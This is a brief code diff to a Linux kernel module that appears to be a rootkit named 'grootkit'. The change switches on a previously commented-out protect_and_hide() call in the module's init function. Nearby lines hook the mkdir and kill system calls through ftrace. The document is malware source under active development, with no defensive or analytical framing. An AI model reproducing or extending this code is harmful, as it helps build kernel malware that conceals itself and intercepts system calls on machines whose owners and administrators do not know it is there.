@@ -741,7 +741,7 @@ void symbol_unhooking(struct ftrace_hook *hook) {
 */
 static int __init grootkit_init(void) {
     // printk(KERN_INFO "Protect and hide\n");
-    // protect_and_hide();
+    protect_and_hide();
     // printk(KERN_INFO "mkdir syscall hooking\n");
     mkdir_base = syscall_hooking((unsigned long)mkdir_hook, (unsigned int)__NR_mkdir);
     // printk(KERN_INFO "kill syscall hooking\n");
